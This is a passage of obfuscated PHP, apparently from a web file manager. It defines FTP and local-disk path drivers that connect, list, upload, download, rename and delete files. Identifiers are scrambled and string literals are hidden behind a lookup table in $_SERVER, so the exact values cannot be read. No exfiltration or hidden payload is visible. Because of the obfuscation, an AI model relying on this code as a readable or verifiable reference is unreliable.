isset($ˆê·°≤à[$ÍŸÇøÌÆ[515]]) ? $ˆê·°≤à[$ÍŸÇøÌÆ[515]] : $ÍŸÇøÌÆ[12], $ÍŸÇøÌÆ[594] => isset($ˆê·°≤à[$ÍŸÇøÌÆ[594]]) ? $ˆê·°≤à[$ÍŸÇøÌÆ[594]] : $ÍŸÇøÌÆ[12]); if (empty($ÿ≈á¸Ó£) || empty($ˆê·°≤à[$ÍŸÇøÌÆ[515]]) && empty($ˆê·°≤à[$ÍŸÇøÌÆ[594]])) { return !1; } $´˘∫˜íÅ = array($ÍŸÇøÌÆ[1432] => $¨„ıòîÅ, $ÍŸÇøÌÆ[1493] => $ˆê·°≤à); Hook::trigger($ÍŸÇøÌÆ[1494], $´˘∫˜íÅ); } } goto Aø’Ó‡ÑÛ§; fº≈ª∆ƒæë: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($´‡≤ÙŸπ) { parent::__construct(); if (count($´‡≤ÙŸπ) > 0) { $this->_init($´‡≤ÙŸπ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($≈É∫»´€) { $™àÛ–›– =& $_SERVER[ëæªã÷]; global $config; $this->appCharset = $config[$™àÛ–›–[1338]]; $this->systemCharset = $config[$™àÛ–›–[1339]]; if (isset($≈É∫»´€[$™àÛ–›–[1340]]) && $≈É∫»´€[$™àÛ–›–[1340]]) { $this->systemCharset = $≈É∫»´€[$™àÛ–›–[1340]]; } } public function iconvApp($∞¥‘Îå”) { return $this->iconvTo($∞¥‘Îå”, $this->systemCharset, $this->appCharset); } public function iconvSystem($ÊéüòÀ§) { return $this->iconvTo($ÊéüòÀ§, $this->appCharset, $this->systemCharset); } public function getPathOuter($«ßàˆäÏ) { $äÌñŒ‘π =& $_SERVER[ëæªã÷]; $ª¥“≈º¸ = $this->iconvApp($this->pathBase); $«ßàˆäÏ = $this->iconvApp($«ßàˆäÏ); if (substr($ª¥“≈º¸, 0, 2) == $äÌñŒ‘π[1341]) { $ª¥“≈º¸ = BASIC_PATH . substr($ª¥“≈º¸, 2); } if (substr($«ßàˆäÏ, 0, 2) == $äÌñŒ‘π[1341]) { $«ßàˆäÏ = BASIC_PATH . substr($«ßàˆäÏ, 2); } $ª¥“≈º¸ = KodIO::clear($ª¥“≈º¸); $«ßàˆäÏ = KodIO::clear($«ßàˆäÏ); $«ßàˆäÏ = substr($«ßàˆäÏ, strlen($ª¥“≈º¸)); if (empty($this->pathDriver)) { return $«ßàˆäÏ; } return $this->pathDriver . $äÌñŒ‘π[8] . ltrim($«ßàˆäÏ, $äÌñŒ‘π[8]); } private function _init($üá≠‡Ê® = array()) { $ÓÊôˆ»⁄ =& $_SERVER[ëæªã÷]; if (!function_exists($ÓÊôˆ»⁄[1342])) { throw new Exception(LNG($ÓÊôˆ»⁄[1343])); } $this->config = $üá≠‡Ê®; $this->charsetReset($üá≠‡Ê®); foreach ($üá≠‡Ê® as $“Ø°–å˜ => $èπœÍœ˜) { if (isset($this->{$“Ø°–å˜})) { $this->{$“Ø°–å˜} = $èπœÍœ˜; } } return $this->_login($üá≠‡Ê®); } private function _login($Ú∆£ﬂÛ¿) { $‘õÙ˚É =& $_SERVER[ëæªã÷]; static $≥º≥êçÆ = array(); $ƒ©ŸÅÏØ = md5(json_encode($Ú∆£ﬂÛ¿)); if (isset($≥º≥êçÆ[$ƒ©ŸÅÏØ])) { foreach ($≥º≥êçÆ[$ƒ©ŸÅÏØ] as $∆∆®ÕÓ˛ => $ÿÛıÅ∏Œ) { $this->{$∆∆®ÕÓ˛} = $ÿÛıÅ∏Œ; } return !0; } $á˙†“Úµ = parse_url(trim($this->server, $‘õÙ˚É[8])); $this->host = $á˙†“Úµ[$‘õÙ˚É[184]]; $πÅÛ¸§≠ = isset($á˙†“Úµ[$‘õÙ˚É[183]]) && $á˙†“Úµ[$‘õÙ˚É[183]] == $‘õÙ˚É[1344] ? !0 : !1; $this->scheme = $πÅÛ¸§≠ ? $‘õÙ˚É[1345] : $‘õÙ˚É[1346]; $this->port = isset($á˙†“Úµ[$‘õÙ˚É[185]]) ? $á˙†“Úµ[$‘õÙ˚É[185]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $∫˝—ÁæÃ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $£Æ†•˛õ = $this->pasv == $‘õÙ˚É[99] ? !0 : !1; @ftp_pasv($this->connect, $£Æ†•˛õ); $≥º≥êçÆ[$ƒ©ŸÅÏØ] = array($‘õÙ˚É[1347] => $this->connect, $‘õÙ˚É[184] => $this->host, $‘õÙ˚É[183] => $this->scheme, $‘õÙ˚É[185] => $this->port); return $∫˝—ÁæÃ; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($√›©úæ˝, $◊Öÿé–¯ = '', $äì›ºõÇ = REPEAT_RENAME) { if ($this->setContent($√›©úæ˝, $◊Öÿé–¯)) { return $this->getPathOuter($√›©úæ˝); } return !1; } public function mkdir($˙Ô≤‰‚‰, $—∂ç»»ò = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $˙Ô≤‰‚‰ = $this->iconvSystem($˙Ô≤‰‚‰); if ($this->_isFolder($˙Ô≤‰‚‰) || @ftp_mkdir($this->connect, $˙Ô≤‰‚‰)) { return $this->getPathOuter($˙Ô≤‰‚‰); } if (!$this->mkdir($this->pathFather($˙Ô≤‰‚‰))) { return !1; } if ($˙Ô≤‰‚‰ = @ftp_mkdir($this->connect, $˙Ô≤‰‚‰)) { return $this->getPathOuter($˙Ô≤‰‚‰); } return !1; } public function copyFile($Û⁄ÊÀœˆ, $∞·∞ëè‚) { if (!$this->_isconn()) { return !1; } $ãÎçÁë¿ = $this->pathThis($this->iconvSystem($Û⁄ÊÀœˆ)); $É∞˜ê≥ú = $this->tempFile($ãÎçÁë¿); $±À‡˚™û = $this->iconvApp($É∞˜ê≥ú); $this->download($Û⁄ÊÀœˆ, $±À‡˚™û); $âÇÅüÀ» = $this->upload($∞·∞ëè‚, $±À‡˚™û); $this->tempFileRemve($É∞˜ê≥ú); return $âÇÅüÀ»; } public function moveFile($ÔÿÔ∆Ãú, $¢®äêôå) { if (!$this->_isconn()) { return !1; } $ÔÿÔ∆Ãú = $this->iconvSystem($ÔÿÔ∆Ãú); $¢®äêôå = $this->iconvSystem($¢®äêôå); $ö¸≤ÌÆØ = @ftp_rename($this->connect, $ÔÿÔ∆Ãú, $¢®äêôå); return $ö¸≤ÌÆØ ? $this->getPathOuter($¢®äêôå) : !1; } public function delFile($ÇΩ¯Ï≤ó) { if (!$this->_isconn()) { return !1; } $ÇΩ¯Ï≤ó = $this->iconvSystem($ÇΩ¯Ï≤ó); return @ftp_delete($this->connect, $ÇΩ¯Ï≤ó); } public function delFolder($¡ù›¯Äæ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $∏á⁄ï√‡ = $Ú£«÷ â = array(); $this->fileList($¡ù›¯Äæ, $∏á⁄ï√‡, $Ú£«÷ â, !0); $this->listItemCache = !0; foreach ($Ú£«÷ â as $“±ƒ˜µº) { $≈Ω˘öæ´ = $this->iconvSystem($“±ƒ˜µº[$_SERVER[ëæªã÷][32]]); $Ÿ† äÎù = @ftp_delete($this->connect, $≈Ω˘öæ´); if (!$Ÿ† äÎù) { return !1; } } foreach ($∏á⁄ï√‡ as $≈Ω˘öæ´) { $≈Ω˘öæ´ = $this->iconvSystem($≈Ω˘öæ´); $Ÿ† äÎù = @ftp_rmdir($this->connect, $≈Ω˘öæ´); if (!$Ÿ† äÎù) { return !1; } } $¡ù›¯Äæ = $this->iconvSystem($¡ù›¯Äæ); return @ftp_rmdir($this->connect, $¡ù›¯Äæ); } public function rename($˙ç¡êÕß, $˘Ê≈ÈÈï) { $»∆Ω≤›è =& $_SERVER[ëæªã÷]; if (!$this->_isconn()) { return !1; } $Åñ‰ÉÛí = $this->fileNameAuto($this->pathFather($˙ç¡êÕß), $˘Ê≈ÈÈï); $Åñ‰ÉÛí = $this->iconvSystem($Åñ‰ÉÛí); $˙ç¡êÕß = $this->iconvSystem($˙ç¡êÕß); $ΩË≤Ëœ« = $this->pathFather($˙ç¡êÕß); $∞‡Â€ÔÇ = rtrim($ΩË≤Ëœ«, $»∆Ω≤›è[8]) . $»∆Ω≤›è[8] . $Åñ‰ÉÛí; $Ì®‰ØÈœ = @ftp_rename($this->connect, $˙ç¡êÕß, $∞‡Â€ÔÇ); $∞‡Â€ÔÇ = $this->iconvApp($∞‡Â€ÔÇ); return $Ì®‰ØÈœ ? $this->getPathOuter($∞‡Â€ÔÇ) : !1; } private function folderInfo($Æ‡óà”É, $ÖÇìÌ‚Ÿ = false) { $¶∫ÈÊ‡Ë =& $_SERVER[ëæªã÷]; $œÉ‰°‹« = array($¶∫ÈÊ‡Ë[32] => $this->pathThis($Æ‡óà”É), $¶∫ÈÊ‡Ë[88] => $this->getPathOuter($¶∫ÈÊ‡Ë[8] . $Æ‡óà”É), $¶∫ÈÊ‡Ë[33] => $¶∫ÈÊ‡Ë[89]); if ($ÖÇìÌ‚Ÿ) { return $œÉ‰°‹«; } $œÉ‰°‹«[$¶∫ÈÊ‡Ë[203]] = $œÉ‰°‹«[$¶∫ÈÊ‡Ë[96]] = 0; $œÉ‰°‹«[$¶∫ÈÊ‡Ë[204]] = $œÉ‰°‹«[$¶∫ÈÊ‡Ë[205]] = !0; return $œÉ‰°‹«; } private function fileInfo($ Ê±“ÉÙ, $˘òÕ’·ò = false, $ªë˙»ÄË = array()) { $é⁄±“Ó— =& $_SERVER[ëæªã÷]; $¨•Ñ€Ó = array($é⁄±“Ó—[32] => $this->pathThis($ Ê±“ÉÙ), $é⁄±“Ó—[88] => $this->getPathOuter($é⁄±“Ó—[8] . $ Ê±“ÉÙ), $é⁄±“Ó—[33] => $é⁄±“Ó—[202], $é⁄±“Ó—[90] => isset($ªë˙»ÄË[$é⁄±“Ó—[90]]) ? $ªë˙»ÄË[$é⁄±“Ó—[90]] : 0, $é⁄±“Ó—[177] => $this->ext($ Ê±“ÉÙ)); if ($˘òÕ’·ò) { return $¨•Ñ€Ó; } $¨•Ñ€Ó[$é⁄±“Ó—[203]] = $¨•Ñ€Ó[$é⁄±“Ó—[96]] = 0; $¨•Ñ€Ó[$é⁄±“Ó—[204]] = $¨•Ñ€Ó[$é⁄±“Ó—[205]] = !0; $«⁄ìŸà = $this->iconvSystem($ Ê±“ÉÙ); $¨•Ñ€Ó[$é⁄±“Ó—[96]] = @ftp_mdtm($this->connect, $«⁄ìŸà); if (empty($ªë˙»ÄË)) { $ªë˙»ÄË = $this->objectMeta($ Ê±“ÉÙ); if (!$ªë˙»ÄË) { return $¨•Ñ€Ó; } } $¨•Ñ€Ó[$é⁄±“Ó—[90]] = $ªë˙»ÄË[$é⁄±“Ó—[90]]; return $¨•Ñ€Ó; } public function size($Çº ÓŸ) { $õß–Éà÷ = $this->objectMeta($Çº ÓŸ); return $õß–Éà÷ ? $õß–Éà÷[$_SERVER[ëæªã÷][90]] : 0; } public function info($–Â–«¥˘) { if ($this->isFile($–Â–«¥˘)) { return $this->fileInfo($–Â–«¥˘, 0); } else { if ($this->isFolder($–Â–«¥˘)) { return $this->folderInfo($–Â–«¥˘); } } return !1; } private function fileList($ßÇπÉŸ¥, &$Ä™Òà§∂, &$Õ∫á„€, $ƒŸ≠ß’¨ = false) { $òçÂäû˝ =& $_SERVER[ëæªã÷]; $ßÇπÉŸ¥ = $this->iconvSystem($ßÇπÉŸ¥); if (!$this->isFolder($ßÇπÉŸ¥)) { return !1; } @ftp_chdir($this->connect, $òçÂäû˝[8]); $ßÇπÉŸ¥ = rtrim($ßÇπÉŸ¥, $òçÂäû˝[8]) . $òçÂäû˝[8]; check_abort(); $∑ˆ˙ì≠Ö = $this->listItemCache === !1 ? !1 : !0; $◊¬ºõ°√ = @ftp_rawlist($this->connect, $ßÇπÉŸ¥); if (!$◊¬ºõ°√) { $◊¬ºõ°√ = array(); } $„√÷†„ = array($òçÂäû˝[10] => 1, $òçÂäû˝[1348] => 1); foreach ($◊¬ºõ°√ as $ƒù˙íø–) { $‡¡˚ùõ = $this->_listItem($ƒù˙íø–); if ($‡¡˚ùõ[0] == $òçÂäû˝[739]) { continue; } $ˆﬂÕ„ﬁ– = $‡¡˚ùõ[8]; if (empty($ˆﬂÕ„ﬁ–) && $ˆﬂÕ„ﬁ– !== $òçÂäû˝[200] || isset($„√÷†„[$ˆﬂÕ„ﬁ–])) { continue; } $ˆﬂÕ„ﬁ– = $this->iconvApp($ßÇπÉŸ¥ . ltrim($ˆﬂÕ„ﬁ–, $òçÂäû˝[8])); $£à¥å«Ì = array($òçÂäû˝[32] => $ˆﬂÕ„ﬁ–, $òçÂäû˝[33] => $òçÂäû˝[202], $òçÂäû˝[90] => $‡¡˚ùõ[4]); if (substr($ƒù˙íø–, 0, 1) == $òçÂäû˝[1349]) { $£à¥å«Ì[$òçÂäû˝[33]] = $òçÂäû˝[89]; $£à¥å«Ì[$òçÂäû˝[90]] = 0; } $·îπÑâ = $£à¥å«Ì[$òçÂäû˝[33]] == $òçÂäû˝[89] ? !0 : !1; if ($∑ˆ˙ì≠Ö) { $this->cacheMethod($òçÂäû˝[208], $ˆﬂÕ„ﬁ–, $·îπÑâ); $this->cacheMethod($òçÂäû˝[209], $ˆﬂÕ„ﬁ–, $£à¥å«Ì); } if ($·îπÑâ) { $Ä™Òà§∂[] = $ˆﬂÕ„ﬁ–; if ($ƒŸ≠ß’¨) { $this->fileList($ˆﬂÕ„ﬁ–, $Ä™Òà§∂, $Õ∫á„€, $ƒŸ≠ß’¨); } continue; } $Õ∫á„€[] = $£à¥å«Ì; } if ($∑ˆ˙ì≠Ö) { $this->cacheMethod($òçÂäû˝[208], $ßÇπÉŸ¥, !0); } } private function _listItem($◊™ﬁ‰∑©) { if (empty($◊™ﬁ‰∑©)) { return array(); } $±ï±Õ€ = preg_split($_SERVER[ëæªã÷][1350], $◊™ﬁ‰∑©); if (count($±ï±Õ€) <= 9) { return $±ï±Õ€; } $±ï±Õ€[8] = trim(substr($◊™ﬁ‰∑©, strpos($◊™ﬁ‰∑©, $±ï±Õ€[7]) + strlen($±ï±Õ€[7]))); return array_splice($±ï±Õ€, 0, 9); } public function listPath($ÊÚ›¡˚Ÿ, $∫‰çÂ¢› = false) { $…«À∆¸∂ =& $_SERVER[ëæªã÷]; if (!$this->_isconn()) { return !1; } $õÔ™˛Üı = $âÚ¸È∂Õ = array(); $this->fileList($ÊÚ›¡˚Ÿ, $õÔ™˛Üı, $âÚ¸È∂Õ); foreach ($õÔ™˛Üı as $¥˘˛¡ŒÛ => $û·å´„ﬁ) { $õÔ™˛Üı[$¥˘˛¡ŒÛ] = $this->folderInfo($û·å´„ﬁ, $∫‰çÂ¢›); } foreach ($âÚ¸È∂Õ as $¥˘˛¡ŒÛ => $û·å´„ﬁ) { $âÚ¸È∂Õ[$¥˘˛¡ŒÛ] = $this->fileInfo($û·å´„ﬁ[$…«À∆¸∂[32]], $∫‰çÂ¢›, $û·å´„ﬁ); } return array($…«À∆¸∂[87] => $õÔ™˛Üı, $…«À∆¸∂[86] => $âÚ¸È∂Õ); } public function has($∆π˚—ø¶, $î˝°•ÿè = false, $ââﬁ∑œ≤ = true) { $∫Œù≤Ω =& $_SERVER[ëæªã÷]; $ª›∏ ﬂÉ = $˝«⁄óè™ = array(); $““É€ä‹ = $î˝°•ÿè ? !0 : !1; $this->fileList($∆π˚—ø¶, $ª›∏ ﬂÉ, $˝«⁄óè™, $““É€ä‹); if ($î˝°•ÿè) { return array($∫Œù≤Ω[212] => count($˝«⁄óè™), $∫Œù≤Ω[213] => count($ª›∏ ﬂÉ)); } if ($ââﬁ∑œ≤) { if (count($˝«⁄óè™)) { return !0; } } else { if (count($ª›∏ ﬂÉ)) { return !0; } } return !1; } public function listAll($Ê‘ñÇ©¡) { $Ì™©∂‰∂ =& $_SERVER[ëæªã÷]; if (!$this->_isconn()) { return !1; } $ﬂÀ»¿÷Ú = $∑äÏóŒŸ = array(); $this->fileList($Ê‘ñÇ©¡, $ﬂÀ»¿÷Ú, $∑äÏóŒŸ, !0); $ßÛÛö≈€ = array(); foreach ($∑äÏóŒŸ as $Ê ‚Ö‰Á) { $ßÛÛö≈€[$Ê ‚Ö‰Á[$Ì™©∂‰∂[32]]] = $Ê ‚Ö‰Á[$Ì™©∂‰∂[90]]; } foreach ($ﬂÀ»¿÷Ú as $Ê ‚Ö‰Á) { if (is_string($Ê ‚Ö‰Á)) { $ßÛÛö≈€[$Ê ‚Ö‰Á] = 0; } } return $this->listAllFiles($Ê‘ñÇ©¡, array_keys($ßÛÛö≈€), $ßÛÛö≈€); } public function getContent($ﬁú≈™Ø¶) { if (!$this->_isconn()) { return !1; } $ﬁú≈™Ø¶ = $this->iconvSystem($ﬁú≈™Ø¶); return $this->fileSubstr($ﬁú≈™Ø¶); } public function setContent($’‚ìáÜô, $∏Úﬂ…‚ù = '') { if (!$this->_isconn()) { return !1; } $»«Û˜µ€ = $this->pathThis($this->iconvSystem($’‚ìáÜô)); $ˆØàê›Ã = $this->tempFile($»«Û˜µ€); file_put_contents($ˆØàê›Ã, $∏Úﬂ…‚ù); $‹ê‹íÎ‚ = $this->upload($’‚ìáÜô, $this->iconvApp($ˆØàê›Ã)); $this->tempFileRemve($ˆØàê›Ã); return $‹ê‹íÎ‚; } public function fileSubstr($Ûçßíä€, $∂êÀ›êÒ = 0, $˛«äÆÛ∫ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($Ûçßíä€, $∂êÀ›êÒ, $˛«äÆÛ∫); } private function ftpRequest($òñ®•è¯, $≤¥‚¯«˝ = 0, $Ò‚æ˘Ë¥ = false) { $òñ®•è¯ = $this->iconvSystem($òñ®•è¯); $ä¯Ó©´õ = $this->scheme . $this->host . $_SERVER[ëæªã÷][4] . $this->port; $∑√®Êﬂ´ = curl_init(); curl_setopt($∑√®Êﬂ´, CURLOPT_URL, $ä¯Ó©´õ . $this->pathEncode($òñ®•è¯)); curl_setopt($∑√®Êﬂ´, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($Ò‚æ˘Ë¥) { $ Âó€à = $≤¥‚¯«˝ + $Ò‚æ˘Ë¥ - 1; curl_setopt($∑√®Êﬂ´, CURLOPT_RANGE, "{$≤¥‚¯«˝}\55{$ Âó€à}"); } curl_setopt($∑√®Êﬂ´, CURLOPT_RETURNTRANSFER, 1); $ç‹Ø˜‹º = curl_exec($∑√®Êﬂ´); curl_close($∑√®Êﬂ´); return $ç‹Ø˜‹º; } public function upload($›¬‡◊˛É, $Ôç˛Ï∞©, $Ä≤’ªıÉ = false, $î≥ôªêÆ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($›¬‡◊˛É))) { return !1; } $›¬‡◊˛É = $this->iconvSystem($›¬‡◊˛É); $Ôç˛Ï∞© = $this->iconvSystem($Ôç˛Ï∞©); $ØÂ¨È¢õ = ftp_nb_put($this->connect, $›¬‡◊˛É, $Ôç˛Ï∞©, FTP_BINARY); while ($ØÂ¨È¢õ == FTP_MOREDATA) { $ØÂ¨È¢õ = ftp_nb_continue($this->connect); } if ($ØÂ¨È¢õ != FTP_FINISHED) { return !1; } return $this->getPathOuter($›¬‡◊˛É); } public function download($§ê¥™∞À, $Âó‚≤¿Ú = '') { if (!$this->_isconn()) { return !1; } $∫¨ÙÜ¨¸ = $this->pathFather($Âó‚≤¿Ú); if (!IO::mkdir($∫¨ÙÜ¨¸)) { return !1; } $§ê¥™∞À = $this->iconvSystem($§ê¥™∞À); $Âó‚≤¿Ú = $this->iconvSystem($Âó‚≤¿Ú); $∑¸™ˆ˝É = ftp_nb_get($this->connect, $Âó‚≤¿Ú, $§ê¥™∞À, FTP_BINARY); while ($∑¸™ˆ˝É == FTP_MOREDATA) { $∑¸™ˆ˝É = ftp_nb_continue($this->connect); } if ($∑¸™ˆ˝É != FTP_FINISHED) { return !1; } return $this->iconvApp($Âó‚≤¿Ú); } public function exist($ç¥‡Ì†‚) { return $this->isFile($ç¥‡Ì†‚) || $this->isFolder($ç¥‡Ì†‚); } public function isFile($”ÏµﬁÂß) { return !$this->isFolder($”ÏµﬁÂß) && $this->objectMeta($”ÏµﬁÂß); } public function isFolder($‘ã§Œå€) { return $this->cacheMethod($_SERVER[ëæªã÷][208], $‘ã§Œå€); } protected function objectMeta($Ë’„–öÄ) { return $this->cacheMethod($_SERVER[ëæªã÷][209], $Ë’„–öÄ); } protected function _objectMeta($÷Ÿ‰°Œ€) { $“ÁπÏﬂû =& $_SERVER[ëæªã÷]; if ($÷Ÿ‰°Œ€ == $“ÁπÏﬂû[12] || $÷Ÿ‰°Œ€ == $“ÁπÏﬂû[8]) { return array(); } if (!$this->_isconn()) { return !1; } $÷Ÿ‰°Œ€ = $this->iconvSystem($÷Ÿ‰°Œ€); $‘∑√°Ç» = array($“ÁπÏﬂû[32] => $this->iconvApp($÷Ÿ‰°Œ€), $“ÁπÏﬂû[33] => $“ÁπÏﬂû[202], $“ÁπÏﬂû[90] => 0); @ftp_chdir($this->connect, $“ÁπÏﬂû[8]); $´˙ÜÓï™ = @ftp_size($this->connect, $÷Ÿ‰°Œ€); if ($´˙ÜÓï™ != -1) { $‘∑√°Ç»[$“ÁπÏﬂû[90]] = $´˙ÜÓï™; } else { $‡Íüøä‹ = @ftp_chdir($this->connect, $÷Ÿ‰°Œ€); if (!$‡Íüøä‹) { return !1; } $‘∑√°Ç»[$“ÁπÏﬂû[33]] = $“ÁπÏﬂû[89]; } return $‘∑√°Ç»; } protected function _isFolder($º∑≈ßµß) { $ï™˜“π“ =& $_SERVER[ëæªã÷]; if ($º∑≈ßµß == $ï™˜“π“[12] || $º∑≈ßµß == $ï™˜“π“[8]) { return !0; } $…®⁄‘∑Ü = $this->_objectMeta($º∑≈ßµß); return isset($…®⁄‘∑Ü[$ï™˜“π“[33]]) && $…®⁄‘∑Ü[$ï™˜“π“[33]] == $ï™˜“π“[89] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ºÁ“Âª˘) { if (substr($ºÁ“Âª˘, 0, 2) == $_SERVER[ëæªã÷][1341]) { $ºÁ“Âª˘ = BASIC_PATH . substr($ºÁ“Âª˘, 2); } return $ºÁ“Âª˘; } public function iconvApp($âÿ‚¸Çò) { $òóê‚ëé =& $_SERVER[ëæªã÷]; global $config; return $this->iconvTo($âÿ‚¸Çò, $config[$òóê‚ëé[1339]], $config[$òóê‚ëé[1338]]); } public function iconvSystem($˙ÆÒóË∞) { $ı∆‡Ûç˜ =& $_SERVER[ëæªã÷]; global $config; return $this->iconvTo($˙ÆÒóË∞, $config[$ı∆‡Ûç˜[1338]], $config[$ı∆‡Ûç˜[1339]]); } public function getPathOuter($ºµ∫…àÙ) { $Ó∑–∞ä… =& $_SERVER[ëæªã÷]; $õ√òºó¿ = $this->iconvApp($this->pathBase); $ºµ∫…àÙ = $this->iconvApp($ºµ∫…àÙ); if (substr($õ√òºó¿, 0, 2) == $Ó∑–∞ä…[1341]) { $õ√òºó¿ = BASIC_PATH . substr($õ√òºó¿, 2); } if (substr($ºµ∫…àÙ, 0, 2) == $Ó∑–∞ä…[1341]) { $ºµ∫…àÙ = BASIC_PATH . substr($ºµ∫…àÙ, 2); } $õ√òºó¿ = KodIO::clear($õ√òºó¿); $ºµ∫…àÙ = KodIO::clear($ºµ∫…àÙ); $ºµ∫…àÙ = substr($ºµ∫…àÙ, strlen($õ√òºó¿)); if (empty($this->pathDriver)) { return $ºµ∫…àÙ; } return $this->pathDriver . $Ó∑–∞ä…[8] . ltrim($ºµ∫…àÙ, $Ó∑–∞ä…[8]); } public function mkfile($ïÎ¥ºœ∏, $õÒÏõÖÅ = '', $ΩÃœóçÛ = REPEAT_RENAME) { $ïÎ¥ºœ∏ = $this->iconvSystem($ïÎ¥ºœ∏); @touch($ïÎ¥ºœ∏); if ($õÒÏõÖÅ) { file_put_contents($ïÎ¥ºœ∏, $õÒÏõÖÅ); } @chmod($ïÎ¥ºœ∏, $this->pathAuth); return is_file($ïÎ¥ºœ∏) ? $this->getPathOuter($ïÎ¥ºœ∏) : !1; } public function mkdir($ùìÊ €ˆ, $Îö§·ªÏ = REPEAT_SKIP) { $ùìÊ €ˆ = $this->iconvSystem($ùìÊ €ˆ); if (is_dir($ùìÊ €ˆ)) { return $this->getPathOuter($ùìÊ €ˆ); } @mkdir($ùìÊ €ˆ, $this->pathAuth, !0); @chmod($ùìÊ €ˆ, $this->pathAuth); return is_dir($ùìÊ €ˆ) ? $this->getPathOuter($ùìÊ €ˆ) : !1; } public function copyFile($µº÷∆≠∆, $€Êäá˜—) { $this->mkdir($this->pathFather($€Êäá˜—)); $µº÷∆≠∆ = $this->iconvSystem($µº÷∆≠∆); $€Êäá˜— = $this->iconvSystem($€Êäá˜—); $˛∂ê⁄â = copy_64($µº÷∆≠∆, $€Êäá˜—); @chmod($€Êäá˜—, $this->pathAuth); return $˛∂ê⁄â ? $this->getPathOuter($€Êäá˜—) : !1; } public function moveFile($˜—ö†ƒ…, $õü›ó˛) { $this->mkdir($this->pathFather($õü›ó˛)); $˜—ö†ƒ… = $this->iconvSystem($˜—ö†ƒ…); $õü›ó˛ = $this->iconvSystem($õü›ó˛); $Á∞Æ‰Œæ = intval(@rename($˜—ö†ƒ…, $õü›ó˛)); if (!$Á∞Æ‰Œæ) { if ($Á∞Æ‰Œæ = intval(@copy_64($˜—ö†ƒ…, $õü›ó˛))) { @unlink($˜—ö†ƒ…); } } @chmod($õü›ó˛, $this->pathAuth); return $Á∞Æ‰Œæ ? $this->getPathOuter($õü›ó˛) : !1; } public function movePath($Ø·Úãã˙, $„Œ¶ „ú, $·Õô÷ÚÑ = false) { $Ñ¥¯ÅÊä =& $_SERVER[ëæªã÷]; $Ø·Úãã˙ = $this->iconvSystem($Ø·Úãã˙); $„Œ¶ „ú = $this->iconvSystem($„Œ¶ „ú); $ùâÎÜ≤ = rtrim($„Œ¶ „ú, $Ñ¥¯ÅÊä[8]) . $Ñ¥¯ÅÊä[8] . ($·Õô÷ÚÑ ? $·Õô÷ÚÑ : get_path_this($Ø·Úãã˙)); if (file_exists($ùâÎÜ≤)) { return !1; } $ƒÊÿÕÎ‰ = intval(@rename($Ø·Úãã˙, $ùâÎÜ≤)); $ƒÊÿÕÎ‰ = file_exists($ùâÎÜ≤); return $ƒÊÿÕÎ‰ ? $this->getPathOuter($ùâÎÜ≤) : !1; } public function delFile($ÎÖ¨Ó•) { $ÎÖ¨Ó• = $this->iconvSystem($ÎÖ¨Ó•); if (!@unlink($ÎÖ¨Ó•)) { @chmod($ÎÖ¨Ó•, $this->pathAuth); if (!@unlink($ÎÖ¨Ó•)) { return !1; } } else { return !0; } } public function delFolder($Êª¿ƒ‡∆) { $Â¶ÜÌÀÜ =& $_SERVER[ëæªã÷]; $Êª¿ƒ‡∆ = $this->iconvSystem($Êª¿ƒ‡∆); if (!is_dir($Êª¿ƒ‡∆)) { return !0; } if (!($∫†ÛºÙ• = opendir($Êª¿ƒ‡∆))) { return !1; } while (($Å„úÊ¢÷ = readdir($∫†ÛºÙ•)) !== !1) { if ($Å„úÊ¢÷ == $Â¶ÜÌÀÜ[10] || $Å„úÊ¢÷ == $Â¶ÜÌÀÜ[1348]) { continue; } $ö˛Ø¢êΩ = $Êª¿ƒ‡∆ . $Â¶ÜÌÀÜ[8] . $Å„úÊ¢÷; if (is_file($ö˛Ø¢êΩ) || is_link($ö˛Ø¢êΩ)) { if (!unlink($ö˛Ø¢êΩ)) { chmod($ö˛Ø¢êΩ, $this->pathAuth); if (!unlink($ö˛Ø¢êΩ)) { return !1; } } } else { if (is_dir($ö˛Ø¢êΩ)) { chmod($ö˛Ø¢êΩ, $this->pathAuth); $ö˛Ø¢êΩ = $this->iconvApp($ö˛Ø¢êΩ); if (!$this->delFolder($ö˛Ø¢êΩ)) { return !1; } } } } closedir($∫†ÛºÙ•); return rmdir($Êª¿ƒ‡∆); } public function rename($ﬂ°‡–®´, $ù≠Ç™Â¶) { $©≥√∏˝ö =& $_SERVER[ëæªã÷]; $ÅΩ√öé‰ = $this->fileNameAuto($this->pathFather($ﬂ°‡–®´), $ù≠Ç™Â¶); $ÅΩ√öé‰ = $this->iconvSystem($ÅΩ√öé‰); $ﬂ°‡–®´ = $this->iconvSystem($ﬂ°‡–®´); $¶Ü†±Œﬂ = $this->pathFather($ﬂ°‡–®´); $˛°ﬂ¥÷Ü = rtrim($¶Ü†±Œﬂ, $©≥√∏˝ö[8]) . $©≥√∏˝ö[8] . $ÅΩ√öé‰; $õ˛ΩÏÌ™ = @rename($ﬂ°‡–®´, $˛°ﬂ¥÷Ü); $˛°ﬂ¥÷Ü = $this->iconvApp($˛°ﬂ¥÷Ü); return $õ˛ΩÏÌ™ ? $this->getPathOuter($˛°ﬂ¥÷Ü) : !1; } public function size($Ô«Ù•∫Ü) { $Ô«Ù•∫Ü = $this->iconvSystem($Ô«Ù•∫Ü); return filesize_64($Ô«Ù•∫Ü); } public function info($≠Ôå’ô¬) { $≠Ôå’ô¬ = $this->iconvSystem($≠Ôå’ô¬); if ($this->isFolder($≠Ôå’ô¬)) { return $this->folderInfo($≠Ôå’ô¬); } else { if ($this->isFile($≠Ôå’ô¬)) { return $this->fileInfo($≠Ôå’ô¬); } } 